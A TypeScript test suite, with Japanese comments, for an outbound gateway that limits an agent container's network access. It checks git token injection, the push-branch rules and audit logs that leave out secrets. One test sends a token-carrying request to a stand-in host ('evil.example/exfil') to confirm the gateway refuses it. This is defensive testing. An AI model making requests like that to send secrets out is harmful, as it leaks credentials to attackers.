import { describe, expect, it } from "vitest";
import {
  basicAuthorization,
  type GitCredential,
  handleOutbound,
  type OutboundDeps,
} from "../../src/outbound-gateway";

const enc = new TextEncoder();
const A = "a".repeat(40);
const B = "b".repeat(40);
const REPO = "https://github.com/acme/hello.git";
const NOW = 1_800_000_000_000;
const CRED: GitCredential = { token: "ghs_secret_token", expiresAt: NOW + 3_600_000 };
const AUTH = `Basic ${btoa("x-access-token:ghs_secret_token")}`;

function pkt(s: string): Uint8Array {
  const b = enc.encode(s);
  return cat(enc.encode((b.length + 4).toString(16).padStart(4, "0")), b);
}
function cat(...parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.length;
  }
  return out;
}
const FLUSH = enc.encode("0000");
const cmd = (ref = "refs/heads/agent/task-t1", caps = "report-status agent=git/2") =>
  cat(pkt(`${A} ${B} ${ref}\0${caps}`), FLUSH);
const PACK = enc.encode("PACK-DATA");

function streamOf(...chunks: Uint8Array[]): ReadableStream<Uint8Array> {
  return new ReadableStream({
    start(c) {
      for (const x of chunks) c.enqueue(x);
      c.close();
    },
  });
}

interface Upstream {
  calls: { url: string; init: RequestInit }[];
  /** upstream に渡された本文を読み切った結果（呼び出し時点で読み始める） */
  bodies: Promise<Uint8Array>[];
}

function setup(over: Partial<OutboundDeps> = {}) {
  const up: Upstream = { calls: [], bodies: [] };
  const reads: string[] = [];
  const deps: OutboundDeps = {
    props: { repo: { owner: "acme", name: "hello" }, task: "agent/task-t1", taskId: "t1" },
    readCredential: async (taskId) => {
      reads.push(taskId);
      return CRED;
    },
    fetchUpstream: async (url, init) => {
      up.calls.push({ url, init });
      if (init.body) up.bodies.push(new Response(init.body as BodyInit).bytes());
      return new Response("upstream-ok", { status: 200 });
    },
    now: () => NOW,
    ...over,
  };
  return { deps, up, reads };
}

const get = (url: string, headers: HeadersInit = {}) => new Request(url, { headers });
const post = (url: string, body: BodyInit | null, headers: HeadersInit = {}) =>
  new Request(url, {
    method: "POST",
    body,
    headers: { "content-type": "application/x-git-receive-pack-request", ...headers },
  });

describe("basicAuthorization", () => {
  it("x-access-token:<token> の Basic", () => {
    expect(basicAuthorization("ghs_x")).toBe(`Basic ${btoa("x-access-token:ghs_x")}`);
  });
});

describe("トークンの注入", () => {
  it("判定を通った github.com の upload-pack（clone/fetch）に Authorization を付ける", async () => {
    const { deps, up } = setup();
    const res = await handleOutbound(
      get(`${REPO}/info/refs?service=git-upload-pack`, { authorization: "Basic ZXZpbDpldmls" }),
      deps,
    );
    expect(res.status).toBe(200);
    expect(new Headers(up.calls[0]?.init.headers).get("authorization")).toBe(AUTH);
  });

  it("コンテナが付けた Authorization は使わず、Worker が決めた値で置き換える", async () => {
    const { deps, up } = setup();
    await handleOutbound(
      post(`${REPO}/git-upload-pack`, "0000", {
        authorization: "Bearer from-container",
        "content-type": "application/x-git-upload-pack-request",
      }),
      deps,
    );
    expect(new Headers(up.calls[0]?.init.headers).get("authorization")).toBe(AUTH);
  });

  it("拒否されたリクエストでは、トークンを読みもせず上流にも出ない", async () => {
    const { deps, up, reads } = setup();
    for (const url of [
      "https://github.com/acme/other.git/info/refs?service=git-upload-pack",
      "https://github.com/acme/hello.git/info/refs?service=git-foo",
      "https://example.com/",
      "https://github.com/acme/hello.git/info/lfs/objects/batch",
    ]) {
      const res = await handleOutbound(get(url), deps);
      expect(res.status, url).toBe(403);
    }
    expect(up.calls).toHaveLength(0);
    expect(reads).toHaveLength(0);
  });

  it("レジストリには Authorization を付けない（トークンを読みもしない）", async () => {
    const { deps, up, reads } = setup();
    await handleOutbound(
      get("https://registry.npmjs.org/tiny-pkg", { authorization: "Bearer x" }),
      deps,
    );
    expect(up.calls).toHaveLength(1);
    expect(new Headers(up.calls[0]?.init.headers).has("authorization")).toBe(false);
    expect(reads).toHaveLength(0);
  });

  it("トークンが無ければ 401。上流には出ない", async () => {
    const { deps, up } = setup({ readCredential: async () => undefined });
    const res = await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
    expect(res.status).toBe(401);
    expect(up.calls).toHaveLength(0);
  });

  it("期限切れ（expiresAt <= now）は 401。上流には出ない", async () => {
    for (const expiresAt of [NOW, NOW - 1]) {
      const { deps, up } = setup({ readCredential: async () => ({ token: "t", expiresAt }) });
      const res = await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
      expect(res.status).toBe(401);
      expect(up.calls).toHaveLength(0);
    }
  });

  it("トークンの読み出しに失敗したら 401（fail-closed）", async () => {
    const { deps, up } = setup({
      readCredential: async () => {
        throw new Error("boom");
      },
    });
    const res = await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
    expect(res.status).toBe(401);
    expect(up.calls).toHaveLength(0);
  });

  it("taskId は props から取る。URL の path や本文の ref から取らない", async () => {
    const { deps, reads } = setup();
    await handleOutbound(
      get("https://github.com/acme/hello.git/info/refs?service=git-upload-pack"),
      deps,
    );
    await handleOutbound(post(`${REPO}/git-receive-pack`, cmd()), deps);
    expect(reads).toEqual(["t1", "t1"]);
    // 別のタスクの ref を名乗っても、トークンは読まない（拒否が先）
    const other = setup();
    const res = await handleOutbound(
      post(`${REPO}/git-receive-pack`, cmd("refs/heads/agent/task-other")),
      other.deps,
    );
    expect(res.status).toBe(403);
    expect(other.reads).toEqual([]);
  });

  it("props に taskId が無ければ（空）、トークンは読めず 401", async () => {
    const { deps, up, reads } = setup();
    deps.props = { repo: deps.props.repo, task: "agent/task-t1", taskId: "" };
    const res = await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
    expect(res.status).toBe(401);
    expect(reads).toEqual([]);
    expect(up.calls).toHaveLength(0);
  });

  it("トークンをログに出さない（console.log / warn / error のすべて）", async () => {
    const { logs, restore } = captureConsole();
    try {
      const { deps } = setup({
        readCredential: async () => ({ token: "ghs_leak", expiresAt: NOW - 1 }),
      });
      await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
    } finally {
      restore();
    }
    expect(logs.length).toBeGreaterThan(0); // 拒否（credential_unavailable）の監査は出ている
    expect(logs.join("\n")).not.toContain("ghs_leak");
  });
});

/** console.log / warn / error の出力を集める。 */
function captureConsole() {
  const logs: string[] = [];
  const orig = { log: console.log, warn: console.warn, error: console.error };
  const grab = (...a: unknown[]) => void logs.push(a.join(" "));
  console.log = grab;
  console.warn = grab;
  console.error = grab;
  return {
    logs,
    restore: () => {
      console.log = orig.log;
      console.warn = orig.warn;
      console.error = orig.error;
    },
  };
}

describe("違反ログは @rovo/audit の JSON（outbound_denied）", () => {
  async function denied(url: string, over: Partial<OutboundDeps> = {}, init?: RequestInit) {
    const { logs, restore } = captureConsole();
    try {
      const { deps } = setup(over);
      const res = await handleOutbound(new Request(url, init), deps);
      return { res, logs };
    } finally {
      restore();
    }
  }

  it("許可外のホストは 1 行の JSON: コード・taskId・宛先の分類だけで、path / query / host / トークンを含まない", async () => {
    const { res, logs } = await denied(
      "https://evil.example/exfil/path?token=ghs_secretvalue0123456789",
    );
    expect(res.status).toBe(403);
    expect(logs).toHaveLength(1);
    const rec = JSON.parse(logs[0] as string);
    expect(rec).toEqual({
      audit: true,
      event: "outbound_denied",
      ts: expect.any(Number),
      taskId: "t1",
      caller: "child",
      reason: "host_not_allowed",
      dest: "other",
    });
    expect(logs[0]).not.toMatch(/evil\.example|exfil|ghs_|token=/);
  });

  it("宛先の分類: github / registry / other", async () => {
    const gh = await denied(`${REPO.replace(".git", "")}x/info/refs?service=git-upload-pack`);
    expect(JSON.parse(gh.logs[0] as string)).toMatchObject({
      event: "outbound_denied",
      dest: "github",
    });
    const reg = await denied("http://registry.npmjs.org/tiny-pkg"); // HTTP（平文）は拒否
    expect(JSON.parse(reg.logs[0] as string)).toMatchObject({ dest: "registry" });
  });

  it("task（作業ブランチ名）は出さず、taskId（認証済みの値）だけを出す", async () => {
    const { logs } = await denied("https://evil.example/");
    expect(logs[0]).not.toContain("agent/task-t1");
    expect(JSON.parse(logs[0] as string).taskId).toBe("t1");
  });

  it("deps.audit があれば、そちらに渡す（console には出さない）。受け取るのは許可したフィールドだけ", async () => {
    const seen: { event: string; fields: Record<string, unknown> }[] = [];
    const { logs, restore } = captureConsole();
    try {
      const { deps } = setup({ audit: (event, fields) => void seen.push({ event, fields }) });
      await handleOutbound(new Request("https://evil.example/p?q=1"), deps);
    } finally {
      restore();
    }
    expect(logs).toEqual([]);
    expect(seen).toEqual([
      {
        event: "outbound_denied",
        fields: { taskId: "t1", caller: "child", reason: "host_not_allowed", dest: "other" },
      },
    ]);
  });

  it("拒否の種類ごとに reason が違う（413 / 401 / receive-pack の検証）", async () => {
    const { logs, restore } = captureConsole();
    try {
      const { deps } = setup({ limits: { receivePackMaxBytes: 100 } });
      const res = await handleOutbound(
        post(`${REPO.replace(".git", "")}/git-receive-pack`, streamOf(cmd()), {
          "content-length": "101",
        }),
        deps,
      );
      expect(res.status).toBe(413);
    } finally {
      restore();
    }
    expect(JSON.parse(logs[0] as string)).toMatchObject({
      reason: "body_too_large",
      dest: "github",
    });
    const noCred = await denied(`${REPO.replace(".git", "")}/info/refs?service=git-upload-pack`, {
      readCredential: async () => undefined,
    });
    expect(JSON.parse(noCred.logs[0] as string)).toMatchObject({
      reason: "credential_unavailable",
    });
  });
});

describe("receive-pack: GET info/refs", () => {
  it("許可して認証を付ける。git-protocol と content-encoding は転送しない", async () => {
    const { deps, up } = setup();
    const res = await handleOutbound(
      get(`${REPO}/info/refs?service=git-receive-pack`, {
        "git-protocol": "version=2",
        "content-encoding": "gzip",
        "user-agent": "git/2",
      }),
      deps,
    );
    expect(res.status).toBe(200);
    const h = new Headers(up.calls[0]?.init.headers);
    expect(h.get("authorization")).toBe(AUTH);
    expect(h.has("git-protocol")).toBe(false);
    expect(h.has("content-encoding")).toBe(false);
    expect(h.get("user-agent")).toBe("git/2");
  });

  it("upload-pack の git-protocol は従来どおり転送する", async () => {
    const { deps, up } = setup();
    await handleOutbound(
      get(`${REPO}/info/refs?service=git-upload-pack`, { "git-protocol": "version=2" }),
      deps,
    );
    expect(new Headers(up.calls[0]?.init.headers).get("git-protocol")).toBe("version=2");
  });
});

describe("receive-pack: POST", () => {
  const url = `${REPO}/git-receive-pack`;

  it("コマンド部を検証した後に転送し、先頭から packfile までを欠けなく流す", async () => {
    const { deps, up } = setup();
    const body = cat(cmd(), PACK);
    // コマンドと packfile が同じチャンクに入っていても、別のチャンクでも、同じ結果になる
    for (const chunks of [
      [body],
      [cmd(), PACK],
      [body.subarray(0, 3), body.subarray(3, 20), body.subarray(20)],
    ]) {
      up.calls.length = 0;
      up.bodies.length = 0;
      const res = await handleOutbound(post(url, streamOf(...chunks)), deps);
      expect(res.status).toBe(200);
      expect(up.calls).toHaveLength(1);
      expect(up.calls[0]?.url).toBe(`${url}`);
      expect(await up.bodies[0]).toEqual(body);
      const h = new Headers(up.calls[0]?.init.headers);
      expect(h.get("authorization")).toBe(AUTH);
      expect(h.get("content-type")).toBe("application/x-git-receive-pack-request");
    }
  });

  it("コマンド部が検証できるまでは upstream を呼ばない。検証できたら packfile の途中でも転送を始める", async () => {
    const { deps, up } = setup();
    let release!: () => void;
    const gate = new Promise<void>((r) => {
      release = r;
    });
    let sentHead = false;
    const slow = new ReadableStream<Uint8Array>({
      async start(c) {
        // コマンド部の途中までしか送らない
        c.enqueue(cmd().subarray(0, 10));
      },
      async pull(c) {
        if (!sentHead) {
          sentHead = true;
          await new Promise((r) => setTimeout(r, 30));
          expect(up.calls).toHaveLength(0); // まだ検証できていないので転送していない
          c.enqueue(cmd().subarray(10));
          return;
        }
        await gate; // packfile は終わらない
        c.enqueue(PACK);
        c.close();
      },
    });
    const pending = handleOutbound(post(url, slow), deps);
    await new Promise((r) => setTimeout(r, 100));
    expect(up.calls).toHaveLength(1); // 本文がまだ終わっていなくても転送が始まっている（ストリーム）
    release();
    await pending;
    expect(await up.bodies[0]).toEqual(cat(cmd(), PACK));
  });

  it("拒否するコマンドでは upstream を呼ばず、トークンも読まない", async () => {
    const bad: Record<string, Uint8Array> = {
      削除: cat(pkt(`${A} ${"0".repeat(40)} refs/heads/agent/task-t1\0x`), FLUSH),
      別ブランチ: cmd("refs/heads/main"),
      タグ: cmd("refs/tags/v1"),
      別タスク: cmd("refs/heads/agent/task-t2"),
      二本: cat(
        pkt(`${A} ${B} refs/heads/agent/task-t1\0x`),
        pkt(`${A} ${B} refs/heads/main`),
        FLUSH,
      ),
      shallow: cat(pkt(`shallow ${A}`), cmd()),
      "push-options": cmd("refs/heads/agent/task-t1", "report-status push-options"),
      sha256: cmd("refs/heads/agent/task-t1", "object-format=sha256"),
      壊れた長さ: enc.encode("zzzz"),
      "40桁以外": cat(pkt(`${"a".repeat(39)} ${B} refs/heads/agent/task-t1\0x`), FLUSH),
    };
    for (const [name, head] of Object.entries(bad)) {
      const { deps, up, reads } = setup();
      const rest = new ReadableStream<Uint8Array>({
        start(c) {
          c.enqueue(head);
        },
        pull(c) {
          c.enqueue(PACK);
          c.close();
        },
      });
      const res = await handleOutbound(post(url, rest), deps);
      expect(res.status, name).toBe(403);
      expect(up.calls, name).toHaveLength(0);
      expect(reads, name).toHaveLength(0);
    }
  });

  it("本文がコマンド部の途中で終わる・空なら拒否する", async () => {
    for (const body of [streamOf(), streamOf(cmd().subarray(0, 12))]) {
      const { deps, up } = setup();
      const res = await handleOutbound(post(url, body), deps);
      expect(res.status).toBe(403);
      expect(up.calls).toHaveLength(0);
    }
  });

  it("content-encoding が付いた POST は拒否する（gzip は検証できない）", async () => {
    const { deps, up } = setup();
    const res = await handleOutbound(
      post(url, streamOf(cmd(), PACK), { "content-encoding": "gzip" }),
      deps,
    );
    expect(res.status).toBe(403);
    expect(up.calls).toHaveLength(0);
  });

  it("content-type が receive-pack のものでなければ拒否する", async () => {
    const { deps, up } = setup();
    const res = await handleOutbound(
      post(url, streamOf(cmd(), PACK), { "content-type": "application/x-git-upload-pack-request" }),
      deps,
    );
    expect(res.status).toBe(403);
    expect(up.calls).toHaveLength(0);
  });

  it("git-protocol ヘッダは転送しない", async () => {
    const { deps, up } = setup();
    await handleOutbound(post(url, streamOf(cmd(), PACK), { "git-protocol": "version=2" }), deps);
    expect(new Headers(up.calls[0]?.init.headers).has("git-protocol")).toBe(false);
  });

  it("トークンが無い・期限切れなら、検証が通っても 401 で上流に出ない", async () => {
    for (const readCredential of [
      async () => undefined,
      async () => ({ token: "t", expiresAt: NOW }),
    ]) {
      const { deps, up } = setup({ readCredential });
      const res = await handleOutbound(post(url, streamOf(cmd(), PACK)), deps);
      expect(res.status).toBe(401);
      expect(up.calls).toHaveLength(0);
    }
  });

  it("本文のサイズ上限を超えたら、上流への送信がエラーで止まる", async () => {
    const { deps, up } = setup({ limits: { receivePackMaxBytes: 64 } });
    up.bodies.length = 0;
    deps.fetchUpstream = async (u, init) => {
      up.calls.push({ url: u, init });
      // 上流が本文を読み切ろうとすると、上限超過でエラーになる
      await new Response(init.body as BodyInit).arrayBuffer();
      return new Response("unreachable");
    };
    await expect(
      handleOutbound(post(url, streamOf(cmd(), new Uint8Array(200))), deps),
    ).rejects.toThrow(/too large/);
  });

  it("Content-Length が上限を超えていたら 413。上流には出ない", async () => {
    const { deps, up } = setup({ limits: { receivePackMaxBytes: 100 } });
    const res = await handleOutbound(post(url, streamOf(cmd()), { "content-length": "101" }), deps);
    expect(res.status).toBe(413);
    expect(up.calls).toHaveLength(0);
  });

  it("コマンド部が届くまでの時間に上限がある（遅いだけの接続を握り続けない）", async () => {
    const { deps, up } = setup({ limits: { headTimeoutMs: 50 } });
    const hang = new ReadableStream<Uint8Array>({
      start(c) {
        c.enqueue(cmd().subarray(0, 8));
      },
      pull: () => new Promise(() => {}),
    });
    const res = await handleOutbound(post(url, hang), deps);
    expect(res.status).toBe(408);
    expect(up.calls).toHaveLength(0);
  });
});

describe("テスト用の転送先", () => {
  it("testUpstream があれば、判定後に偽サーバーへ向け、元のホストを x-original-host で伝える", async () => {
    const { deps, up } = setup({ testUpstream: "http://127.0.0.1:9000" });
    await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
    expect(up.calls[0]?.url).toBe(
      "http://127.0.0.1:9000/acme/hello.git/info/refs?service=git-upload-pack",
    );
    expect(new Headers(up.calls[0]?.init.headers).get("x-original-host")).toBe("github.com");
  });
});
